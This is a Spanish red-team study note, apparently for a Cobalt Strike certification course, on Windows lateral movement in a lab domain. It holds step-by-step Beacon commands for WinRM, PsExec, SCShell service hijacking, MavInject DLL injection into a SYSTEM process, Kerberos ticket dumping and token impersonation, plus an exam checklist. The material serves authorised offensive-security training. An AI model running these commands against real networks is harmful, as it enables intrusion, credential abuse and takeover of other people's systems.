---
title: "Lateral Movement"
date: 2026-05-14 10:00:00 +0100
categories: [ZeroPointSecurity, Windows]
tags: [Cobalt Strike]
---

> **Objetivo:** Moverse a otros equipos de la red usando protocolos legítimos de administración remota con credenciales de usuario comprometido.
> **MITRE:** Lateral Movement [TA0008]

---

## Índice rápido
- [[#Contexto — primitivas de Cobalt Strike]]
- [[#Comparativa de técnicas]]
- [[#TÉCNICA 1 — WinRM (mejor OPSEC)]]
- [[#TÉCNICA 2 — PsExec (más ruidoso)]]
- [[#TÉCNICA 3 — SCShell (técnica personalizada — Lab)]]
- [[#TÉCNICA 4 — MavInject (LOLBAS)]]
- [[#remote-exec — ejecución remota sin spawn de Beacon]]
- [[#Logon Types — por qué el Beacon lateral no puede autenticarse en el dominio]]
- [[#Lab — SCShell con impersonación de usuario]]
- [[#Checklist de examen]]

---

## Contexto — primitivas de Cobalt Strike

> Cobalt Strike ofrece dos primitivas para ejecución remota. `jump` automatiza todo el flujo; `remote-exec` requiere pasos manuales pero es más flexible.

### jump — solución integral para lateral movement

```bash
# Sintaxis: jump [exploit] [target] [listener]
beacon> jump

# Exploits disponibles por defecto:
# psexec      x86  → Service EXE artifact via SCM
# psexec64    x64  → Service EXE artifact via SCM
# psexec_psh  x86  → PowerShell one-liner via SCM
# winrm       x86  → PowerShell script via WinRM
# winrm64     x64  → PowerShell script via WinRM
# + técnicas custom cargadas via .cna (ej: scshell64)

# Automatiza: upload payload → ejecutar remoto → conectar P2P → eliminar payload
```

### remote-exec — ejecución remota de comandos arbitrarios

```bash
# Sintaxis: remote-exec [method] [target] [command]
beacon> remote-exec

# Métodos disponibles:
# psexec  → vía Service Control Manager
# winrm   → vía WinRM (PowerShell) — ÚNICO que devuelve output
# wmi     → vía WMI

# Útil cuando: la técnica no se puede integrar en jump, o solo necesitas ejecutar un comando
```

---

## Comparativa de técnicas

| Técnica | Comando | Corre como | Escribe disco | OPSEC | Output |
|---|---|---|---|---|---|
| **WinRM** | `jump winrm64` | Usuario suplantado | ❌ No | ✅ Alta | ✅ Sí (remote-exec) |
| **PsExec** | `jump psexec64` | SYSTEM | ✅ Sí (svc EXE) | ⚠️ Baja | ❌ No |
| **SCShell** | `jump scshell64` | SYSTEM | ✅ Sí (temporal) | ✅ Media | ❌ No |
| **MavInject** | `remote-exec wmi mavinject.exe` | Proceso objetivo | ✅ DLL en disco | ⚠️ Media | ❌ No |

**Regla de uso:**
- WinRM disponible → usar WinRM
- WinRM bloqueado → SCShell (modifica servicio existente, no crea uno nuevo)
- Necesitas SYSTEM sin levantar servicio → MavInject via WMI
- Emulación de adversario específico → PsExec o técnica custom

---

## TÉCNICA 1 — WinRM (mejor OPSEC)
**Requiere:** Admin local en el objetivo | **Corre como:** Usuario suplantado | **Escribe disco:** No

> Ejecuta un script PowerShell en memoria via WinRM. No crea servicios ni escribe ejecutables en disco. Es el único método de `remote-exec` que devuelve output.

```bash
# Lateral movement completo — spawn nuevo Beacon via WinRM
beacon> jump winrm64 lon-ws-1 smb
# → [+] established link to child beacon: 10.10.120.10

# Ejecución remota con output (único remote-exec que devuelve resultado)
beacon> remote-exec winrm lon-ws-1 net sessions
beacon> remote-exec winrm lon-ws-1 whoami
beacon> remote-exec winrm lon-ws-1 Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id
```

> **Nota:** el Beacon resultante corre en el contexto del usuario suplantado (no SYSTEM). Para acceder a recursos del dominio desde el nuevo Beacon necesitarás `make_token` o `kerberos_ticket_use` en él (ver sección Logon Types).

---

## TÉCNICA 2 — PsExec (más ruidoso)
**Requiere:** Admin local en el objetivo | **Corre como:** SYSTEM | **Escribe disco:** Sí (svc EXE temporal)

> Crea un nuevo servicio en el SCM del objetivo, ejecuta el payload, y borra el servicio. Siempre da SYSTEM. Técnica más detectable — la creación de servicios es un evento inusual.

```bash
# x64 — Service EXE artifact
beacon> jump psexec64 lon-ws-1 smb
# → Started service <nombre_random> on lon-ws-1
# → [+] established link to child beacon

# x86
beacon> jump psexec lon-ws-1 smb

# PowerShell one-liner (evita escribir EXE — usa PS)
beacon> jump psexec_psh lon-ws-1 smb
```

> ⚠️ **OPSEC:** La creación de servicios nuevos es uno de los eventos más monitorizados. Muy ruidoso en entornos con EDR. Preferir WinRM o SCShell cuando sea posible.

---

## TÉCNICA 3 — SCShell (técnica personalizada — Lab)
**Requiere:** Admin local en el objetivo | **Corre como:** SYSTEM | **Escribe disco:** Sí (temporal) | **Loader:** Aggressor script `.cna`

> Modifica un servicio **existente** (defragsvc por defecto) temporalmente para ejecutar el payload, luego restaura el path original. Más silencioso que PsExec porque no crea un servicio nuevo — solo modifica uno existente.

### Preparación

```bash
# 1. Cargar el Aggressor script de SCShell en CS
# CS Client → Cobalt Strike > Script Manager → Load
# Seleccionar: C:\Tools\SCShell\CS-BOF\scshell.cna

# 2. Configurar spawnto del service payload (no acepta env vars en contexto SYSTEM)
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

### Ejecución

```bash
# Sintaxis: jump scshell64 [target] [listener]
beacon> jump scshell64 lon-ws-1 smb
# → Modifica defragsvc → ejecuta payload → restaura path original
# → [+] established link to child beacon

# Output interno de SCShell:
# Opening defragsvc
# Original service binary path "C:\Windows\system32\svchost.exe -k defragsvc"
# Service path was changed to "C:\Windows\System32\evil81.exe"
# Service was started
# Service path was restored to "C:\Windows\system32\svchost.exe -k defragsvc"
```

> ⚠️ **Error 1056 — `StartServiceA failed to start the service. 1056`:** El servicio ya estaba en estado de transición. SCShell no para el servicio primero. Solución: esperar unos minutos y volver a ejecutar `jump scshell64 lon-ws-1 smb`.

---

## TÉCNICA 4 — MavInject (LOLBAS)
**Requiere:** Admin local | **Corre como:** Proceso objetivo | **Escribe disco:** Sí (DLL)

> Usa `mavinject.exe` (binario firmado por Microsoft, presente en System32) para inyectar una DLL en un proceso remoto ya corriendo. No crea servicios. Útil para emulación de adversarios que usan LOLBAS.

```bash
# 1. Listar procesos remotos para elegir el objetivo
beacon> remote-exec winrm lon-ws-1 Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id
# Buscar proceso con el usuario/contexto deseado (ej: spoolsv - SYSTEM, PID 1992)

# 2. Subir la DLL payload al target
beacon> cd \\lon-ws-1\ADMIN$\System32
beacon> upload C:\Payloads\smb_x64.dll

# 3. Inyectar via WMI usando mavinject.exe
# Sintaxis: mavinject.exe [PID] /INJECTRUNNING [DLL_PATH]
beacon> remote-exec wmi lon-ws-1 mavinject.exe 1992 /INJECTRUNNING C:\Windows\System32\smb_x64.dll
# → Started process XXXX on lon-ws-1

# 4. Conectar con el nuevo Beacon via named pipe
beacon> link lon-ws-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
# → [+] established link to child beacon: 10.10.120.10
```

> ⚠️ **OPSEC:** AppLocker y WDAC pueden bloquear MavInject. Sysmon registra la creación del proceso. Más adecuado para emulación de adversarios que para simulaciones sigilosas.

---

## remote-exec — ejecución remota sin spawn de Beacon

> Ejecuta comandos en el objetivo sin crear un Beacon nuevo. Útil para reconocimiento remoto o cuando necesitas ejecutar algo específico antes de hacer el lateral movement.

```bash
# WinRM — devuelve output (el más útil para enumeración)
beacon> remote-exec winrm lon-ws-1 whoami
beacon> remote-exec winrm lon-ws-1 net sessions
beacon> remote-exec winrm lon-ws-1 Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id
beacon> remote-exec winrm lon-ws-1 ipconfig /all
beacon> remote-exec winrm lon-ws-1 iwr http://lon-wkstn-1:28190/test    # probar conectividad

# WMI — no devuelve output
beacon> remote-exec wmi lon-ws-1 mavinject.exe 1992 /INJECTRUNNING C:\Windows\System32\evil.dll

# PsExec via remote-exec — no devuelve output
beacon> remote-exec psexec lon-ws-1 cmd.exe /c whoami
```

---

## Logon Types — por qué el Beacon lateral no puede autenticarse en el dominio

> ⚠️ **Trampa crítica:** tras hacer lateral movement con WinRM o PsExec, el Beacon resultante puede NO poder acceder a recursos del dominio (LDAP, shares, etc.) aunque hayas suplantado a un usuario de dominio.

**Por qué ocurre:**

| Logon Type | Almacena credenciales en LSASS remoto | Técnicas que lo usan |
|---|---|---|
| **Network** | ❌ No | WinRM, PsExec, SMB |
| **Interactive** | ✅ Sí | RDP, inicio de sesión local |
| **Network Cleartext** | ✅ Sí | WinRM con credenciales explícitas |
| **New Credentials** | ❌ Solo para red | `make_token`, runas /netonly |
| **Remote Interactive** | ✅ Sí | RDP |

**Consecuencia:** WinRM y PsExec usan Logon Type **Network** → el Beacon lateral solo tiene el ticket del servicio que usó para conectarse (ej: `HTTP/lon-ws-1`), sin TGT → no puede obtener tickets para LDAP, CIFS, etc.

**Solución:**

```bash
# Desde el Beacon lateral — inyectar credenciales para recursos de dominio
beacon> make_token CONTOSO\rsteel Passw0rd!           # si tienes contraseña
beacon> kerberos_ticket_use C:\...\rsteel.kirbi        # si tienes TGT

# Alternativamente: hacer la enumeración de dominio desde el Beacon original
# (que ya tiene las credenciales) y no desde el Beacon lateral
```

---

## Lab — SCShell con impersonación de usuario

> **Objetivo:** Impersonar a rsteel y hacer lateral movement a lon-ws-1 usando SCShell.

```bash
# PASO 1 — Impersonar a rsteel (desde Beacon existente)
# Opción A: si tienes contraseña en claro
beacon> make_token CONTOSO\rsteel Passw0rd!

# Opción B: si tienes el TGT (desde Credential Access)
beacon> krb_triage
beacon> krb_dump /user:rsteel /service:krbtgt
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[B64_TICKET]"))
beacon> make_token CONTOSO\rsteel FakePass
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi

# PASO 2 — Cargar SCShell Aggressor script
# CS Client → Cobalt Strike > Script Manager → Load
# → C:\Tools\SCShell\CS-BOF\scshell.cna

# PASO 3 — Configurar spawnto para el service binary
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe

# PASO 4 — Lateral movement a lon-ws-1
beacon> jump scshell64 lon-ws-1 smb
# → [+] established link to child beacon (SYSTEM en lon-ws-1)

# Si aparece error 1056:
# → Esperar unos minutos → volver a ejecutar jump scshell64 lon-ws-1 smb

# PASO 5 — Verificar el nuevo Beacon
# El nuevo Beacon corre como SYSTEM en lon-ws-1
# Para acceder a recursos de dominio desde él:
beacon> make_token CONTOSO\rsteel Passw0rd!   # o inyectar ticket
```

---

## Checklist de examen

```
PREPARACIÓN — antes de hacer lateral movement
[ ] getuid → confirmar usuario actual y si tienes credenciales de otro usuario
[ ] Impersonar al usuario objetivo:
    [ ] make_token CONTOSO\rsteel Passw0rd!        (contraseña en claro)
    [ ] O: make_token + kerberos_ticket_use         (con TGT)
[ ] Confirmar acceso al objetivo: ls \\lon-ws-1\c$  (si falla → problema de credenciales)

ELECCIÓN DE TÉCNICA (por OPSEC, de mejor a peor)
[ ] ¿WinRM disponible?   → jump winrm64 lon-ws-1 smb
[ ] ¿WinRM bloqueado?    → cargar scshell.cna → ak-settings spawnto_x64 C:\Windows\System32\svchost.exe → jump scshell64 lon-ws-1 smb
[ ] ¿Necesitas LOLBAS?   → remote-exec winrm (Get-Process) → upload DLL → remote-exec wmi mavinject.exe → link
[ ] ¿Necesitas SYSTEM y todo lo demás falla? → jump psexec64 lon-ws-1 smb

WINRM
[ ] beacon> jump winrm64 lon-ws-1 smb
[ ] → Beacon corre como usuario suplantado (NO SYSTEM)

PSEXEC
[ ] beacon> jump psexec64 lon-ws-1 smb
[ ] → Beacon corre como SYSTEM

SCSHELL (Lab)
[ ] CS → Cobalt Strike > Script Manager → Load → C:\Tools\SCShell\CS-BOF\scshell.cna
[ ] beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
[ ] beacon> jump scshell64 lon-ws-1 smb
[ ] Si error 1056: esperar y repetir jump
[ ] → Beacon corre como SYSTEM

MAVINJECT (LOLBAS)
[ ] beacon> remote-exec winrm lon-ws-1 Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id
[ ] Anotar PID del proceso objetivo
[ ] beacon> cd \\lon-ws-1\ADMIN$\System32 && upload C:\Payloads\smb_x64.dll
[ ] beacon> remote-exec wmi lon-ws-1 mavinject.exe [PID] /INJECTRUNNING C:\Windows\System32\smb_x64.dll
[ ] beacon> link lon-ws-1 TSVCPIPE-[GUID]

TRAS EL LATERAL MOVEMENT — si el Beacon lateral no puede acceder al dominio
[ ] Verificar que tienes solo el ticket del servicio: run klist
[ ] Inyectar credenciales: make_token CONTOSO\rsteel Passw0rd!
[ ] O inyectar TGT:        make_token CONTOSO\rsteel FakePass → kerberos_ticket_use rsteel.kirbi
[ ] O: hacer la enumeración de dominio desde el Beacon original (más simple)
```

